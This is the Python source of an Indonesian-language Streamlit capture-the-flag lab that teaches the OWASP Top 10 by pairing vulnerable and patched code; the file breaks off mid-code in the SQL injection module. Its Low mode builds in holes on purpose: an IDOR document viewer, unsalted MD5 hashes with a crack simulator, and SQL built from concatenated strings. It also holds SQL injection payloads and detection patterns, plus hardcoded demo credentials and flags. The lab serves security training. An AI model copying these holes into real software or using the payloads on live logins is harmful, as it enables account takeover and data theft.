import streamlit as st
import html
import hashlib
import json
import re
import base64
import time
import random
import urllib.parse
from datetime import datetime
import firebase_admin
from firebase_admin import credentials, firestore

# ─────────────────────────────────────────────
# FIREBASE INIT
# ─────────────────────────────────────────────
@st.cache_resource
def init_firebase():
    if not firebase_admin._apps:
        # Membaca konfigurasi dari Streamlit Secrets
        firebase_creds = dict(st.secrets["firebase_secrets"])
        firebase_creds["private_key"] = firebase_creds["private_key"].replace("\\n", "\n")
        cred = credentials.Certificate(firebase_creds)
        firebase_admin.initialize_app(cred)
    return firestore.client()

try:
    db = init_firebase()
    FIREBASE_OK = True
except Exception as e:
    FIREBASE_OK = False
    st.error(
        "🔥 Gagal konek ke Firebase. Registrasi/login tidak akan berfungsi sampai ini diperbaiki.\n\n"
        f"**Detail error:** `{e}`"
    )
    st.stop()

# ─────────────────────────────────────────────
# PAGE CONFIG
# ─────────────────────────────────────────────
st.set_page_config(
    page_title="SVWL – OWASP Top 10 2025",
    page_icon="🔐",
    layout="wide",
    initial_sidebar_state="expanded",
)

# ─────────────────────────────────────────────
# CUSTOM CSS
# ─────────────────────────────────────────────
st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Inter:wght@300;400;500;600;700&display=swap');

:root {
    --bg-primary:    #0a0e1a;
    --bg-secondary:  #0f1624;
    --bg-panel:      #141d2e;
    --bg-card:       #1a2540;
    --bg-input:      #0d1526;
    --accent-red:    #ff3c5a;
    --accent-green:  #00e676;
    --accent-blue:   #2979ff;
    --accent-yellow: #ffd600;
    --accent-orange: #ff6d00;
    --accent-purple: #d500f9;
    --text-primary:  #e8eaf6;
    --text-secondary:#90a4ae;
    --text-dim:      #546e7a;
    --border:        #1e2d45;
    --mono:          'Share Tech Mono', monospace;
    --sans:          'Inter', sans-serif;
}

html, body, [class*="css"] {
    background-color: var(--bg-primary) !important;
    color: var(--text-primary) !important;
    font-family: var(--sans) !important;
}

#MainMenu, footer, header { visibility: hidden; }
.stDeployButton { display: none; }

::-webkit-scrollbar { width: 6px; }
::-webkit-scrollbar-track { background: var(--bg-secondary); }
::-webkit-scrollbar-thumb { background: var(--accent-blue); border-radius: 3px; }

[data-testid="stSidebar"] {
    background: var(--bg-secondary) !important;
    border-right: 1px solid var(--border);
}
[data-testid="stSidebar"] .stSelectbox label,
[data-testid="stSidebar"] p,
[data-testid="stSidebar"] span,
[data-testid="stSidebar"] div { color: var(--text-primary) !important; }

.main .block-container {
    background: var(--bg-primary) !important;
    padding: 1.5rem 2rem !important;
    max-width: 1200px;
}

h1, h2, h3, h4 {
    font-family: var(--mono) !important;
    color: var(--text-primary) !important;
}

.stTextInput input, .stTextArea textarea, .stSelectbox select {
    background: var(--bg-input) !important;
    border: 1px solid var(--border) !important;
    color: var(--text-primary) !important;
    font-family: var(--mono) !important;
    border-radius: 4px !important;
}
.stTextInput input:focus, .stTextArea textarea:focus {
    border-color: var(--accent-blue) !important;
    box-shadow: 0 0 0 2px rgba(41,121,255,0.2) !important;
}

.stButton > button {
    background: var(--accent-blue) !important;
    color: #fff !important;
    border: none !important;
    border-radius: 4px !important;
    font-family: var(--mono) !important;
    font-size: 0.85rem !important;
    padding: 0.5rem 1.2rem !important;
    transition: all 0.2s !important;
    font-weight: 600 !important;
    letter-spacing: 0.5px;
}
.stButton > button:hover {
    background: #1565c0 !important;
    box-shadow: 0 0 12px rgba(41,121,255,0.4) !important;
    transform: translateY(-1px);
}

.stSuccess { background: rgba(0,230,118,0.08) !important; border-left: 3px solid var(--accent-green) !important; }
.stError   { background: rgba(255,60,90,0.08)  !important; border-left: 3px solid var(--accent-red)   !important; }
.stWarning { background: rgba(255,214,0,0.08)  !important; border-left: 3px solid var(--accent-yellow) !important; }
.stInfo    { background: rgba(41,121,255,0.08) !important; border-left: 3px solid var(--accent-blue)  !important; }

.stCode, code, pre {
    background: #060c18 !important;
    border: 1px solid var(--border) !important;
    font-family: var(--mono) !important;
    color: var(--accent-green) !important;
    border-radius: 4px !important;
}

.stTabs [role="tablist"] { border-bottom: 1px solid var(--border); }
.stTabs [role="tab"] {
    background: transparent !important;
    color: var(--text-secondary) !important;
    font-family: var(--mono) !important;
    font-size: 0.8rem !important;
    border: none !important;
    border-bottom: 2px solid transparent !important;
    padding: 0.5rem 1rem !important;
}
.stTabs [role="tab"][aria-selected="true"] {
    color: var(--accent-blue) !important;
    border-bottom-color: var(--accent-blue) !important;
    background: transparent !important;
}
.stTabs [role="tabpanel"] {
    background: var(--bg-panel) !important;
    border: 1px solid var(--border) !important;
    border-top: none !important;
    padding: 1rem !important;
    border-radius: 0 0 4px 4px;
}

.streamlit-expanderHeader {
    background: var(--bg-card) !important;
    border: 1px solid var(--border) !important;
    color: var(--text-primary) !important;
    font-family: var(--mono) !important;
    border-radius: 4px !important;
}
.streamlit-expanderContent {
    background: var(--bg-panel) !important;
    border: 1px solid var(--border) !important;
    border-top: none !important;
}

[data-baseweb="select"] > div {
    background: var(--bg-input) !important;
    border: 1px solid var(--border) !important;
    color: var(--text-primary) !important;
}

[data-testid="metric-container"] {
    background: var(--bg-card) !important;
    border: 1px solid var(--border) !important;
    border-radius: 4px !important;
    padding: 0.5rem !important;
}

hr { border-color: var(--border) !important; margin: 1.5rem 0 !important; }
</style>
""", unsafe_allow_html=True)

# ─────────────────────────────────────────────
# SESSION STATE INIT
# ─────────────────────────────────────────────
if "current_user" not in st.session_state:
    st.session_state.current_user = "guest"
if "current_role" not in st.session_state:
    st.session_state.current_role = "user"

# Ambil data progres dari Firestore (hanya jika sudah login)
if st.session_state.current_user != "guest":
    user_doc_ref = db.collection("scoreboard").document(st.session_state.current_user)
    user_doc = user_doc_ref.get()
    if user_doc.exists:
        data = user_doc.to_dict()
        # Hanya sync dari Firestore jika belum di-load di session ini
        if "score_loaded" not in st.session_state:
            st.session_state.score = data.get("score", 0)
            st.session_state.solved_flags = set(data.get("solved_flags", []))
            st.session_state.score_loaded = True
    else:
        if "score_loaded" not in st.session_state:
            st.session_state.score = 0
            st.session_state.solved_flags = set()
            st.session_state.score_loaded = True
else:
    if "score" not in st.session_state:
        st.session_state.score = 0
    if "solved_flags" not in st.session_state:
        st.session_state.solved_flags = set()

defaults = {
    "session_token": "eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciIsImlhdCI6MTcwMDAwMDAwMH0.dummysig",
    "jwt_tampered": False,
    "login_attempts": 0,
    "xxe_log": [],
    "ssrf_log": [],
    "ratelimit_counter": 0,
    "xss_comments": [
        {"author": "alice", "text": "Lab ini sangat informatif!", "ts": "10:00"},
        {"author": "bob",   "text": "Saya belajar banyak dari SVWL.", "ts": "10:15"},
    ],
    "a09_blind_count": 0,
}
for k, v in defaults.items():
    if k not in st.session_state:
        st.session_state[k] = v

# ─────────────────────────────────────────────
# DATA & FLAGS
# ─────────────────────────────────────────────
USERS_DB = {
    "admin":      {"password_hash": hashlib.md5(b"admin123").hexdigest(),  "role": "admin",  "email": "admin@svwl.local"},
    "guest":      {"password_hash": hashlib.md5(b"guest").hexdigest(),     "role": "user",   "email": "guest@svwl.local"},
    "developer":  {"password_hash": hashlib.md5(b"dev2025").hexdigest(),   "role": "dev",    "email": "dev@svwl.local"},
    "' OR '1'='1":{"password_hash": "",                                    "role": "admin",  "email": "injected@svwl.local"},
}

DOCUMENTS_DB = {
    "101": {"owner": "guest",     "classification": "PUBLIC",       "content": "Notulen rapat rutin Q1 - tidak ada informasi sensitif."},
    "102": {"owner": "guest",     "classification": "INTERNAL",     "content": "Budget planning divisi IT semester 2."},
    "103": {"owner": "developer", "classification": "CONFIDENTIAL", "content": "Credential staging server: db_pass=St4g1ng#2025"},
    "104": {"owner": "admin",     "classification": "SECRET",       "content": "FLAG: SVWL{A01_idor_broken_access_2025}"},
    "105": {"owner": "admin",     "classification": "SECRET",       "content": "Master key rotation schedule - Q2 2025."},
}

PRODUCTS_DB = {
    "1": {"name": "Laptop Bisnis",      "price": 12000000, "stock": 15},
    "2": {"name": "Mouse Wireless",     "price": 350000,   "stock": 42},
    "3": {"name": "Keyboard Mekanikal", "price": 800000,   "stock": 8},
}

FLAGS = {
    "A01": "SVWL{A01_idor_broken_access_2025}",
    "A02": "SVWL{A02_crypto_failure_md5_2025}",
    "A03": "SVWL{A03_sqli_bypass_login_2025}",
    "A04": "SVWL{A04_insecure_design_no_ratelimit}",
    "A05": "SVWL{A05_security_misconfig_debug_2025}",
    "A06": "SVWL{A06_vuln_component_log4shell}",
    "A07": "SVWL{A07_xss_stored_via_markdown}",
    "A08": "SVWL{A08_ssrf_internal_network_2025}",
    "A09": "SVWL{A09_logging_failure_bypass_2025}",
    "A10": "SVWL{A10_jwt_none_alg_privesc_2025}",
}

FLAG_POINTS = {k: 100 for k in FLAGS}

OWASP_DESCRIPTIONS = {
    "A01": ("Broken Access Control",          "🔓", "#ff3c5a"),
    "A02": ("Cryptographic Failures",         "🔑", "#ff6d00"),
    "A03": ("Injection",                      "💉", "#ffd600"),
    "A04": ("Insecure Design",                "🏗️", "#00e676"),
    "A05": ("Security Misconfiguration",      "⚙️", "#2979ff"),
    "A06": ("Vulnerable Components",          "📦", "#00b0ff"),
    "A07": ("XSS / Injection (Output)",       "🪝", "#d500f9"),
    "A08": ("SSRF",                           "🌐", "#ff4081"),
    "A09": ("Logging & Monitoring Failures",  "📋", "#69f0ae"),
    "A10": ("JWT / Auth Failures",            "🎭", "#ea80fc"),
}

# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────
def hash_password(password: str) -> str:
    """SHA-256 untuk password user login (bukan simulasi MD5 lab)."""
    return hashlib.sha256(password.encode()).hexdigest()


def submit_flag_to_firestore(module_key: str) -> bool:
    """
    Submit flag ke Firestore dan update session state.
    Mengembalikan True jika flag baru (belum pernah solve), False jika sudah.
    """
    if module_key in st.session_state.solved_flags:
        return False

    pts = FLAG_POINTS[module_key]
    # Update Firestore
    user_ref = db.collection("scoreboard").document(st.session_state.current_user)
    user_ref.set({
        "username": st.session_state.current_user,
        "solved_flags": firestore.ArrayUnion([module_key]),
        "score": firestore.Increment(pts),
        "last_updated": firestore.SERVER_TIMESTAMP,
    }, merge=True)

    # Update session state lokal
    st.session_state.solved_flags.add(module_key)
    st.session_state.score += pts
    return True


def badge(text: str, color: str = "#2979ff") -> str:
    return (
        f'<span style="background:{color}22;color:{color};border:1px solid {color}55;'
        f'border-radius:3px;padding:2px 8px;font-size:0.72rem;font-family:var(--mono);'
        f'font-weight:600;">{text}</span>'
    )


def lab_header(code: str, flag_key: str):
    name, icon, color = OWASP_DESCRIPTIONS[code]
    solved = flag_key in st.session_state.solved_flags
    pts = FLAG_POINTS[flag_key]
    status_html = (
        f'<span style="color:#00e676;font-size:0.8rem;">✅ SOLVED +{pts}pts</span>'
        if solved else
        '<span style="color:#ff3c5a;font-size:0.8rem;">⬜ UNSOLVED</span>'
    )
    st.markdown(f"""
    <div style="background:#141d2e;border:1px solid #1e2d45;border-left:4px solid {color};
                border-radius:4px;padding:1rem 1.2rem;margin-bottom:1rem;">
        <div style="display:flex;justify-content:space-between;align-items:center;">
            <div>
                <span style="font-size:1.5rem;">{icon}</span>
                <span style="font-family:var(--mono);font-size:1.1rem;font-weight:700;
                             color:{color};margin-left:0.5rem;">{code}</span>
                <span style="font-family:var(--mono);font-size:1rem;color:#90a4ae;
                             margin-left:0.5rem;">– {name}</span>
            </div>
            <div>{status_html}</div>
        </div>
    </div>
    """, unsafe_allow_html=True)


def flag_submit(module_key: str):
    """Widget submit flag — hanya untuk user yang sudah login."""
    st.markdown("---")
    st.markdown(
        f'<p style="font-family:var(--mono);font-size:0.8rem;color:#546e7a;">'
        f'FLAG SUBMISSION – {module_key}</p>',
        unsafe_allow_html=True,
    )

    if st.session_state.current_user == "guest":
        st.warning("⚠️ Login terlebih dahulu untuk menyimpan progress flag.")
        return

    col_a, col_b = st.columns([3, 1])
    with col_a:
        flag_input = st.text_input(
            "Masukkan flag:",
            key=f"flag_input_{module_key}",
            placeholder="SVWL{...}",
        )
    with col_b:
        st.markdown("<br>", unsafe_allow_html=True)
        if st.button("Validasi", key=f"validate_{module_key}"):
            if flag_input.strip() == FLAGS[module_key]:
                is_new = submit_flag_to_firestore(module_key)
                if is_new:
                    st.success(f"✅ Correct! +{FLAG_POINTS[module_key]} poin – progress tersimpan!")
                    time.sleep(0.8)
                    st.rerun()
                else:
                    st.info("Flag sudah pernah disubmit sebelumnya.")
            else:
                st.error("❌ Flag salah. Terus eksplorasi!")


def hint_expander(hints: list):
    with st.expander("💡 Hint (klik untuk buka)"):
        for i, h in enumerate(hints, 1):
            st.markdown(
                f'<p style="font-family:var(--mono);font-size:0.82rem;color:#90a4ae;">'
                f'Hint {i}: {h}</p>',
                unsafe_allow_html=True,
            )


def source_expander(vuln_code: str, secure_code: str):
    with st.expander("🔍 Source Code Comparison"):
        c1, c2 = st.columns(2)
        with c1:
            st.markdown(
                '<p style="color:#ff3c5a;font-family:var(--mono);font-size:0.8rem;">⚠️ VULNERABLE (Low)</p>',
                unsafe_allow_html=True,
            )
            st.code(vuln_code, language="python")
        with c2:
            st.markdown(
                '<p style="color:#00e676;font-family:var(--mono);font-size:0.8rem;">✅ SECURE (High)</p>',
                unsafe_allow_html=True,
            )
            st.code(secure_code, language="python")


# ─────────────────────────────────────────────
# AUTH GATE — halaman login / register
# ─────────────────────────────────────────────
if st.session_state.current_user == "guest":
    st.markdown(
        "<h2 style='text-align:center;font-family:var(--mono);'>🔐 SVWL AUTHENTICATION</h2>",
        unsafe_allow_html=True,
    )

    tab_login, tab_register = st.tabs(["🔑 LOGIN", "📝 REGISTER"])

    with tab_login:
        with st.form("login_form", clear_on_submit=False):
            login_user = st.text_input("Username:", key="login_username")
            login_pass = st.text_input("Password:", type="password", key="login_password")
            submit_login = st.form_submit_button("Masuk Aplikasi")

        if submit_login:
            if not login_user.strip() or not login_pass.strip():
                st.error("Username dan password tidak boleh kosong.")
            else:
                try:
                    user_ref = db.collection("users").document(login_user)
                    user_doc = user_ref.get()

                    if user_doc.exists and user_doc.to_dict().get("password") == hash_password(login_pass):
                        st.session_state.current_user = login_user
                        st.session_state.current_role = user_doc.to_dict().get("role", "user")
                        if "score_loaded" in st.session_state:
                            del st.session_state["score_loaded"]
                        st.success(f"Login sukses! Selamat datang, {login_user}.")
                        time.sleep(0.8)
                        st.rerun()
                    else:
                        st.error("Username atau password salah.")
                except Exception as e:
                    st.error(f"Gagal menghubungi database saat login: `{e}`")

    with tab_register:
        with st.form("register_form", clear_on_submit=False):
            reg_user = st.text_input("Buat Username:", key="reg_username")
            reg_pass = st.text_input("Buat Password:", type="password", key="reg_password")
            submit_register = st.form_submit_button("Daftar Akun Baru")

        if submit_register:
            if not reg_user.strip() or not reg_pass.strip():
                st.error("Input tidak boleh kosong.")
            elif len(reg_pass) < 6:
                st.error("Password minimal 6 karakter.")
            else:
                try:
                    user_ref = db.collection("users").document(reg_user)
                    if user_ref.get().exists:
                        st.error("Username sudah digunakan orang lain.")
                    else:
                        user_ref.set({
                            "username": reg_user,
                            "password": hash_password(reg_pass),
                            "role": "user",
                            "created_at": firestore.SERVER_TIMESTAMP,
                        })
                        st.success("Registrasi berhasil! Silakan pindah ke tab LOGIN.")
                except Exception as e:
                    st.error(f"Gagal menyimpan akun baru ke database: `{e}`")

    st.stop()

# ─────────────────────────────────────────────
# SIDEBAR — hanya muncul setelah login
# ─────────────────────────────────────────────
with st.sidebar:
    st.markdown("""
    <div style="text-align:center;padding:0.8rem 0 1rem 0;border-bottom:1px solid #1e2d45;">
        <p style="font-family:'Share Tech Mono',monospace;font-size:1.3rem;color:#2979ff;
                  font-weight:700;margin:0;letter-spacing:2px;">⟨SVWL⟩</p>
        <p style="font-family:'Share Tech Mono',monospace;font-size:0.65rem;color:#546e7a;
                  margin:0;letter-spacing:1px;">STREAMLIT VULNERABLE WEB LAB</p>
        <p style="font-family:'Share Tech Mono',monospace;font-size:0.6rem;color:#37474f;
                  margin:0.3rem 0 0 0;">OWASP TOP 10 – 2025 EDITION</p>
    </div>
    """, unsafe_allow_html=True)

    st.markdown("<br>", unsafe_allow_html=True)

    security_level = st.selectbox(
        "🛡️ Security Level",
        ["Low", "Medium", "High"],
        help="Low = Vulnerable (untuk eksploitasi) | High = Patched (untuk referensi)",
    )

    st.markdown("---")

    # Score dashboard
    total_flags  = len(FLAGS)
    solved_count = len(st.session_state.solved_flags)
    pct = int(solved_count / total_flags * 100) if total_flags > 0 else 0

    st.markdown(f"""
    <div style="background:#141d2e;border:1px solid #1e2d45;border-radius:4px;padding:0.8rem;">
        <p style="font-family:var(--mono);font-size:0.7rem;color:#546e7a;margin:0 0 0.4rem 0;">PROGRESS</p>
        <p style="font-family:var(--mono);font-size:1.4rem;color:#2979ff;margin:0;font-weight:700;">
            {st.session_state.score} <span style="font-size:0.7rem;color:#546e7a;">PTS</span>
        </p>
        <p style="font-family:var(--mono);font-size:0.75rem;color:#90a4ae;margin:0.2rem 0;">
            {solved_count}/{total_flags} flags solved ({pct}%)
        </p>
        <div style="background:#0a0e1a;border-radius:2px;height:4px;margin-top:0.5rem;">
            <div style="background:#2979ff;width:{pct}%;height:4px;border-radius:2px;transition:width 0.5s;"></div>
        </div>
    </div>
    """, unsafe_allow_html=True)

    st.markdown("---")

    # Flag status per modul
    st.markdown(
        '<p style="font-family:var(--mono);font-size:0.7rem;color:#546e7a;margin:0 0 0.5rem 0;">FLAG STATUS</p>',
        unsafe_allow_html=True,
    )
    for k, (name, icon, color) in OWASP_DESCRIPTIONS.items():
        solved = k in st.session_state.solved_flags
        dot    = '<span style="color:#00e676;">●</span>' if solved else '<span style="color:#1e2d45;">●</span>'
        st.markdown(
            f'<p style="font-family:var(--mono);font-size:0.72rem;'
            f'color:#{"90a4ae" if solved else "37474f"};margin:2px 0;">'
            f'{dot} {k} – {name[:22]}{"…" if len(name) > 22 else ""}</p>',
            unsafe_allow_html=True,
        )

    st.markdown("---")

    if st.button("🚪 Logout", key="btn_logout"):
        # Bersihkan semua session state
        for key in list(st.session_state.keys()):
            del st.session_state[key]
        st.rerun()

    st.markdown(f"""
    <div style="font-family:var(--mono);font-size:0.65rem;color:#263238;line-height:1.6;margin-top:0.5rem;">
        <p>Session: {st.session_state.current_user} [{st.session_state.current_role}]</p>
        <p>Security: {security_level}</p>
        <p>⚠️ FOR EDUCATIONAL USE ONLY</p>
    </div>
    """, unsafe_allow_html=True)

# ─────────────────────────────────────────────
# MAIN HEADER
# ─────────────────────────────────────────────
st.markdown("""
<div style="border-bottom:1px solid #1e2d45;padding-bottom:1rem;margin-bottom:1.5rem;">
    <h1 style="font-family:'Share Tech Mono',monospace;color:#2979ff;margin:0;font-size:1.6rem;">
        ⟨ Streamlit Vulnerable Web Lab ⟩
    </h1>
    <p style="font-family:'Share Tech Mono',monospace;color:#546e7a;font-size:0.75rem;margin:0.3rem 0 0 0;">
        OWASP Top 10 – 2025 | Interactive Security Learning Platform
    </p>
</div>
""", unsafe_allow_html=True)

# ─────────────────────────────────────────────
# MODULE TABS
# ─────────────────────────────────────────────
tabs = st.tabs([
    "🏠 Dashboard",
    "A01 Access Control",
    "A02 Crypto",
    "A03 Injection",
    "A04 Design",
    "A05 Misconfig",
    "A06 Components",
    "A07 XSS",
    "A08 SSRF",
    "A09 Logging",
    "A10 JWT Auth",
    "🚩 Scoreboard",
])

# ════════════════════════════════════════════
# TAB 0: DASHBOARD
# ════════════════════════════════════════════
with tabs[0]:
    st.markdown(f"""
    <div style="background:#141d2e;border:1px solid #1e2d45;border-radius:4px;
                padding:1.2rem;margin-bottom:1.5rem;">
        <h3 style="font-family:var(--mono);color:#2979ff;margin:0 0 0.5rem 0;">
            Selamat Datang, {st.session_state.current_user}!
        </h3>
        <p style="color:#90a4ae;font-size:0.9rem;line-height:1.7;margin:0;">
            Platform ini mensimulasikan kerentanan web nyata berdasarkan
            <b style="color:#e8eaf6;">OWASP Top 10 2025</b>.
            Setiap modul menampilkan implementasi <b style="color:#ff3c5a;">rentan</b> (Low) dan
            <b style="color:#00e676;">aman</b> (High) untuk perbandingan langsung.
            Temukan flag tersembunyi di setiap modul!
        </p>
    </div>
    """, unsafe_allow_html=True)

    col1, col2, col3, col4 = st.columns(4)
    col1.metric("Total Poin", f"{st.session_state.score}")
    col2.metric("Flag Solved", f"{solved_count}/{total_flags}")
    col3.metric("Security Level", security_level)
    col4.metric("Role", st.session_state.current_role.upper())

    st.markdown("### Daftar Modul")
    for code, (name, icon, color) in OWASP_DESCRIPTIONS.items():
        solved      = code in st.session_state.solved_flags
        bg          = "#0d1a0d" if solved else "#141d2e"
        border      = "#00e676" if solved else "#1e2d45"
        status      = "✅ SOLVED" if solved else "⬜ PENDING"
        status_color = "#00e676" if solved else "#37474f"
        st.markdown(f"""
        <div style="background:{bg};border:1px solid {border};border-left:3px solid {color};
                    border-radius:4px;padding:0.7rem 1rem;margin-bottom:0.5rem;
                    display:flex;justify-content:space-between;align-items:center;">
            <div>
                <span style="font-size:1.1rem;">{icon}</span>
                <span style="font-family:var(--mono);font-weight:700;color:{color};margin-left:0.4rem;">{code}</span>
                <span style="font-family:var(--mono);color:#90a4ae;margin-left:0.4rem;font-size:0.9rem;">– {name}</span>
            </div>
            <span style="font-family:var(--mono);font-size:0.75rem;color:{status_color};">{status}</span>
        </div>
        """, unsafe_allow_html=True)

    st.markdown("---")
    st.markdown("""
    <div style="background:#1a0808;border:1px solid #4a1515;border-radius:4px;padding:1rem;">
        <p style="font-family:var(--mono);font-size:0.75rem;color:#ff3c5a;margin:0 0 0.3rem 0;">
            ⚠️ DISCLAIMER
        </p>
        <p style="font-size:0.82rem;color:#e57373;margin:0;">
            Platform ini dibuat HANYA untuk tujuan edukasi keamanan siber.
            Semua kerentanan yang didemonstrasikan adalah simulasi dalam lingkungan terisolasi.
            Jangan terapkan teknik ini pada sistem yang bukan milik Anda.
        </p>
    </div>
    """, unsafe_allow_html=True)

# ════════════════════════════════════════════
# TAB 1: A01 – BROKEN ACCESS CONTROL (IDOR)
# ════════════════════════════════════════════
with tabs[1]:
    lab_header("A01", "A01")
    st.markdown("""
    **Skenario:** Anda login sebagai pengguna biasa. Sistem menyimpan dokumen dengan ID numerik.
    Temukan dokumen rahasia yang seharusnya hanya bisa diakses oleh `admin`.
    """)

    hint_expander([
        "Coba ubah ID dokumen dari 101, 102, ke angka lain.",
        "ID dokumen bersifat berurutan. Ada 5 dokumen dalam sistem (101–105).",
        "Dokumen dengan ID 104 milik admin – coba akses pada mode Low.",
    ])

    st.markdown("#### 📂 Document Viewer")
    col_a, col_b = st.columns([2, 1])
    with col_a:
        doc_id = st.text_input("Document ID:", value="101", key="a01_docid")
    with col_b:
        st.markdown("<br>", unsafe_allow_html=True)
        fetch_doc = st.button("Buka Dokumen", key="a01_fetch")

    if fetch_doc:
        if doc_id in DOCUMENTS_DB:
            doc = DOCUMENTS_DB[doc_id]
            if security_level == "Low":
                st.markdown(f"""
                <div style="background:#060c18;border:1px solid #1e2d45;border-radius:4px;padding:1rem;margin-top:0.5rem;">
                    <p style="font-family:var(--mono);font-size:0.75rem;color:#546e7a;margin:0 0 0.5rem 0;">
                        DOCUMENT ID: {doc_id} | OWNER: {doc["owner"]} | CLASS: {doc["classification"]}
                    </p>
                    <p style="font-family:var(--mono);color:#00e676;margin:0;">{doc["content"]}</p>
                </div>
                """, unsafe_allow_html=True)
            elif security_level == "Medium":
                if doc["owner"] == st.session_state.current_user:
                    st.success(f"Dokumen: {doc['content']}")
                elif doc["classification"] in ("PUBLIC", "INTERNAL"):
                    st.info(f"Dokumen publik/internal: {doc['content']}")
                else:
                    st.error("Akses ditolak – dokumen bersifat CONFIDENTIAL/SECRET.")
            else:
                user_role   = st.session_state.current_role
                owner_match = doc["owner"] == st.session_state.current_user
                is_admin    = user_role == "admin"
                if is_admin or owner_match or (doc["classification"] == "PUBLIC"):
                    st.success(f"✅ Akses diizinkan: {doc['content']}")
                else:
                    st.error("🚫 Akses Ditolak! Anda tidak memiliki hak atas dokumen ini.")
                    st.info("Log akses tidak sah telah dicatat ke sistem.")
        else:
            st.error(f"Dokumen ID '{html.escape(doc_id)}' tidak ditemukan.")

    source_expander(
        """# VULNERABLE – tidak ada cek kepemilikan
doc = DOCUMENTS_DB[doc_id]
st.write(doc["content"])  # Siapapun bisa akses""",
        """# SECURE – validasi RBAC
if doc["owner"] == current_user or is_admin:
    st.write(doc["content"])
else:
    st.error("Akses ditolak")
    audit_log(current_user, doc_id, "DENIED")""",
    )
    flag_submit("A01")

# ════════════════════════════════════════════
# TAB 2: A02 – CRYPTOGRAPHIC FAILURES
# ════════════════════════════════════════════
with tabs[2]:
    lab_header("A02", "A02")
    st.markdown("""
    **Skenario:** Sistem menyimpan password dengan hash lemah (MD5 tanpa salt). Hash yang bocor
    dapat di-crack dengan rainbow table. Crack hash admin untuk menemukan flag.
    """)

    hint_expander([
        "MD5 adalah hash function yang sudah usang dan tidak aman untuk password.",
        "Hash MD5 dari 'admin123' adalah 0192023a7bbd73250516f069df18b500.",
        "Gunakan hash tersebut di tool crack di bawah untuk membuktikan kerentanan.",
        "Flag muncul setelah berhasil crack hash admin.",
    ])

    st.markdown("#### 💾 Leaked Hash Database (Simulasi Data Breach)")
    if security_level == "Low":
        st.markdown("""
        <div style="background:#060c18;border:1px solid #4a1515;border-radius:4px;padding:1rem;font-family:var(--mono);font-size:0.8rem;">
            <p style="color:#ff3c5a;margin:0 0 0.5rem 0;">[!] EXPOSED USER TABLE – users.db</p>
            <p style="color:#90a4ae;margin:0;">id | username   | password_hash                    | role</p>
            <p style="color:#37474f;margin:0;">---|------------|----------------------------------|------</p>
            <p style="color:#e8eaf6;margin:0;">1  | admin      | 0192023a7bbd73250516f069df18b500 | admin</p>
            <p style="color:#e8eaf6;margin:0;">2  | guest      | 084e0343a0486ff05530df6c705c8bb4 | user</p>
            <p style="color:#e8eaf6;margin:0;">3  | developer  | a61fbf0df74b2bfe3dc35c6ba3445e54 | dev</p>
        </div>
        """, unsafe_allow_html=True)

        st.markdown("#### 🔨 MD5 Crack Simulator")
        col1, col2 = st.columns(2)
        with col1:
            hash_to_crack = st.text_input(
                "MD5 Hash Target:",
                value="0192023a7bbd73250516f069df18b500",
                key="a02_hash",
            )
        with col2:
            st.selectbox("Wordlist:", ["rockyou-top100.txt", "common-passwords.txt", "admin-passwords.txt"])

        if st.button("🔨 Crack Hash", key="a02_crack"):
            rainbow = {
                hashlib.md5(b"admin123").hexdigest(): "admin123",
                hashlib.md5(b"guest").hexdigest():    "guest",
                hashlib.md5(b"dev2025").hexdigest():  "dev2025",
                hashlib.md5(b"password").hexdigest(): "password",
                hashlib.md5(b"123456").hexdigest():   "123456",
            }
            with st.spinner("Bruteforcing..."):
                time.sleep(1.5)
            if hash_to_crack.strip().lower() in rainbow:
                cracked = rainbow[hash_to_crack.strip().lower()]
                st.markdown(f"""
                <div style="background:#0d1a0d;border:1px solid #1b5e20;border-radius:4px;padding:1rem;">
                    <p style="font-family:var(--mono);color:#00e676;margin:0 0 0.3rem 0;">✅ HASH CRACKED!</p>
                    <p style="font-family:var(--mono);color:#90a4ae;margin:0;">Hash: {html.escape(hash_to_crack)}</p>
                    <p style="font-family:var(--mono);color:#e8eaf6;margin:0;">Password: <b style="color:#ff3c5a;">{cracked}</b></p>
                    <p style="font-family:var(--mono);color:#546e7a;font-size:0.75rem;margin-top:0.5rem;">
                        MD5 crack selesai dalam 0.003 detik via rainbow table.
                    </p>
                </div>
                """, unsafe_allow_html=True)
                if hash_to_crack.strip().lower() == hashlib.md5(b"admin123").hexdigest():
                    st.success(f"🚩 Admin credential ditemukan! FLAG: {FLAGS['A02']}")
            else:
                st.error("Hash tidak ada di rainbow table. Coba hash admin dari tabel di atas.")
    else:
        st.success("✅ Sistem menggunakan bcrypt dengan salt – tidak ada hash yang di-ekspos.")
        st.code("""
import bcrypt

def hash_password(password: str) -> bytes:
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt)

def verify_password(password: str, hashed: bytes) -> bool:
    return bcrypt.checkpw(password.encode(), hashed)
        """, language="python")

    source_expander(
        "password_hash = hashlib.md5(password.encode()).hexdigest()\n# Tersimpan di DB tanpa salt",
        "hashed = bcrypt.hashpw(pwd.encode(), bcrypt.gensalt(12))\n# bcrypt dengan cost factor 12",
    )
    flag_submit("A02")

# ════════════════════════════════════════════
# TAB 3: A03 – INJECTION (SQL INJECTION)
# ════════════════════════════════════════════
with tabs[3]:
    lab_header("A03", "A03")
    st.markdown("""
    **Skenario:** Form login menggunakan string concatenation untuk query SQL.
    Bypass autentikasi tanpa mengetahui password menggunakan SQL Injection.
    """)

    hint_expander([
        "Coba masukkan karakter khusus SQL seperti tanda kutip tunggal (') di field username.",
        "Payload klasik: `' OR '1'='1` – kondisi ini selalu bernilai TRUE.",
        "Payload lain: `admin'--` untuk mengabaikan pengecekan password.",
        "Perhatikan query SQL yang dihasilkan di bawah form (mode Low).",
    ])

    st.markdown("#### 🔐 Login Panel (Simulasi SQL Backend)")
    col1, col2 = st.columns(2)
    with col1:
        login_user_a03 = st.text_input("Username:", key="a03_user", placeholder="e.g. admin")
    with col2:
        login_pass_a03 = st.text_input("Password:", type="password", key="a03_pass", placeholder="••••••••")

    if st.button("Login", key="a03_login"):
        if security_level == "Low":
            simulated_query = (
                f"SELECT * FROM users WHERE username='{login_user_a03}' "
                f"AND password=md5('{login_pass_a03}')"
            )
            st.code(f"[Query]: {simulated_query}", language="sql")

            sqli_patterns = ["' or ", "or '1'='1", "admin'--", "' or 1=1", "--", "/*", "' or 1--"]
